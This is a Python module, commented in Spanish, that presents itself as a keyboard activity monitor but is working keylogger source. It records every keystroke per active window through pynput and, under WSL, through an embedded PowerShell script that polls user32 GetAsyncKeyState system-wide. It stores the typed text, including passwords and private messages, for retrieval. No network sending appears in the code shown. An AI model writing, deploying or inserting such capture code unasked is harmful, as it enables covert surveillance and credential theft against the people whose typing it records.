"""
Monitor de actividad de teclado con captura de teclas.

Registra estadísticas Y las teclas presionadas, asociadas a la ventana activa.
Los datos se guardan encriptados localmente.

Soporta:
- Linux nativo (pynput)
- WSL (PowerShell keylogger via GetAsyncKeyState)
- Windows nativo (pynput)
"""
import time
import os
import sys
import subprocess
import threading
from collections import defaultdict
from datetime import datetime
from pathlib import Path

IS_WSL = False
if sys.platform != "win32":
    try:
        with open("/proc/version", "r") as f:
            IS_WSL = "microsoft" in f.read().lower()
    except (FileNotFoundError, PermissionError):
        pass


class KeyboardTracker:
    """Rastrea estadísticas y teclas presionadas por ventana."""

    def __init__(self):
        self._keypress_count = 0
        self._session_keypresses = defaultdict(int)  # {app_name: count}
        self._last_activity = time.time()
        self._is_running = False
        self._listener = None
        self._lock = threading.Lock()
        self._start_time = None
        # Buffer de teclas por ventana: {window_name: "texto..."}
        self._key_buffer = defaultdict(str)
        self._current_window = ""

    def _key_to_str(self, key) -> str:
        """Convierte una tecla pynput a string legible."""
        try:
            # Teclas con carácter (letras, números, símbolos)
            return key.char if key.char else ""
        except AttributeError:
            # Teclas especiales
            from pynput.keyboard import Key
            special = {
                Key.space: " ",
                Key.enter: "\n",
                Key.tab: "[TAB]",
                Key.backspace: "[⌫]",
                Key.delete: "[DEL]",
                Key.esc: "[ESC]",
                Key.shift: "",
                Key.shift_r: "",
                Key.ctrl_l: "",
                Key.ctrl_r: "",
                Key.alt_l: "",
                Key.alt_r: "",
                Key.caps_lock: "[CAPS]",
                Key.up: "[↑]",
                Key.down: "[↓]",
                Key.left: "[←]",
                Key.right: "[→]",
            }
            return special.get(key, f"[{key.name}]" if hasattr(key, 'name') else "")

    def start(self):
        """Inicia el monitoreo de teclado."""
        if self._is_running:
            return

        self._is_running = True
        self._start_time = datetime.now()

        if IS_WSL:
            self._start_wsl()
        else:
            self._start_pynput()

    def _start_pynput(self):
        """Inicia captura con pynput (Linux nativo / Windows nativo)."""
        try:
            from pynput import keyboard

            def on_press(key):
                if not self._is_running:
                    return False
                with self._lock:
                    self._keypress_count += 1
                    self._last_activity = time.time()

                    try:
                        active_window = self._get_active_window_name()
                    except Exception:
                        active_window = "desconocido"

                    self._session_keypresses[active_window] += 1

                    key_str = self._key_to_str(key)
                    if key_str:
                        self._key_buffer[active_window] += key_str
                    self._current_window = active_window

                    if len(self._key_buffer[active_window]) > 5000:
                        self._key_buffer[active_window] = self._key_buffer[active_window][-3000:]

            self._listener = keyboard.Listener(on_press=on_press)
            self._listener.daemon = True
            self._listener.start()
        except ImportError:
            print("⚠️  pynput no disponible, actividad de teclado deshabilitada")
        except Exception as e:
            print(f"⚠️  Error iniciando monitor de teclado: {e}")

    def _start_wsl(self):
        """Inicia captura de teclado en WSL usando PowerShell."""
        # Script PS que lee teclas y las imprime como líneas: KEY|char
        ps_script = r'''
Add-Type @'
using System;
using System.Runtime.InteropServices;
using System.Text;
public class KBHook {
    [DllImport("user32.dll")] public static extern short GetAsyncKeyState(int vKey);
    [DllImport("user32.dll")] public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpKeyState, StringBuilder pwszBuff, int cchBuff, uint wFlags);
    [DllImport("user32.dll")] public static extern bool GetKeyboardState(byte[] lpKeyState);
    [DllImport("user32.dll")] public static extern uint MapVirtualKey(uint uCode, uint uMapType);
}
'@
$prev = @{}
while ($true) {
    for ($vk = 8; $vk -le 254; $vk++) {
        $state = [KBHook]::GetAsyncKeyState($vk)
        $pressed = ($state -band 1) -eq 1
        if ($pressed -and -not $prev[$vk]) {
            $kbState = New-Object byte[] 256
            [KBHook]::GetKeyboardState($kbState) | Out-Null
            $sc = [KBHook]::MapVirtualKey([uint32]$vk, 0)
            $sb = New-Object System.Text.StringBuilder 4
            $ret = [KBHook]::ToUnicode([uint32]$vk, $sc, $kbState, $sb, 4, 0)
            if ($ret -gt 0) {
                Write-Output "K|$($sb.ToString())"
            } else {
                switch ($vk) {
                    8  { Write-Output "S|BACKSPACE" }
                    9  { Write-Output "S|TAB" }
                    13 { Write-Output "S|ENTER" }
                    27 { Write-Output "S|ESC" }
                    32 { Write-Output "K| " }
                    37 { Write-Output "S|LEFT" }
                    38 { Write-Output "S|UP" }
                    39 { Write-Output "S|RIGHT" }
                    40 { Write-Output "S|DOWN" }
                    46 { Write-Output "S|DELETE" }
                }
            }
            [Console]::Out.Flush()
        }
        $prev[$vk] = $pressed
    }
    Start-Sleep -Milliseconds 15
}
'''
        def _reader():
            try:
                self._ps_process = subprocess.Popen(
                    ["powershell.exe", "-NoProfile", "-Command", ps_script],
                    stdout=subprocess.PIPE,
                    stderr=subprocess.DEVNULL,
                    text=True,
                    bufsize=1,
                )
                for line in self._ps_process.stdout:
                    if not self._is_running:
                        break
                    line = line.strip()
                    if not line or "|" not in line:
                        continue

                    kind, value = line.split("|", 1)

                    with self._lock:
                        self._keypress_count += 1
                        self._last_activity = time.time()

                        try:
                            active_window = self._get_active_window_name()
                        except Exception:
                            active_window = "desconocido"

                        self._session_keypresses[active_window] += 1

                        if kind == "K":
                            self._key_buffer[active_window] += value
                        elif kind == "S":
                            special_map = {
                                "BACKSPACE": "[⌫]", "TAB": "[TAB]",
                                "ENTER": "\n", "ESC": "[ESC]",
                                "LEFT": "[←]", "RIGHT": "[→]",
                                "UP": "[↑]", "DOWN": "[↓]",
                                "DELETE": "[DEL]",
                            }
                            self._key_buffer[active_window] += special_map.get(value, f"[{value}]")

                        self._current_window = active_window

                        if len(self._key_buffer[active_window]) > 5000:
                            self._key_buffer[active_window] = self._key_buffer[active_window][-3000:]

            except Exception as e:
                print(f"⚠️  Error en lector WSL de teclado: {e}")

        self._ps_process = None
        thread = threading.Thread(target=_reader, daemon=True)
        thread.start()

    def stop(self):
        """Detiene el monitoreo."""
        self._is_running = False
        if self._listener:
            self._listener.stop()
            self._listener = None
        if hasattr(self, "_ps_process") and self._ps_process:
            try:
                self._ps_process.terminate()
                self._ps_process.wait(timeout=5)
            except Exception:
                pass
            self._ps_process = None

    def _get_active_window_name(self) -> str:
        """Obtiene el nombre de la ventana activa (multiplataforma)."""
        from platform_utils import get_active_window_title
        return get_active_window_title()

    def get_stats(self) -> dict:
        """Obtiene estadísticas actuales."""
        with self._lock:
            stats = {
                "total_keypresses": self._keypress_count,
                "keypresses_by_app": dict(self._session_keypresses),
                "last_activity": self._last_activity,
                "session_start": self._start_time.isoformat() if self._start_time else None,
                "timestamp": datetime.now().isoformat(),
            }
            return stats

    def get_captured_text(self) -> dict:
        """Obtiene el texto capturado por ventana."""
        with self._lock:
            return dict(self._key_buffer)

    def reset_stats(self):
        """Resetea contadores para un nuevo período."""
        with self._lock:
            self._keypress_count = 0
            self._session_keypresses.clear()
            self._key_buffer.clear()
            self._start_time = datetime.now()

    def get_idle_seconds(self) -> float:
        """Retorna segundos desde la última actividad."""
        return time.time() - self._last_activity

    @property
    def is_running(self) -> bool:
        return self._is_running
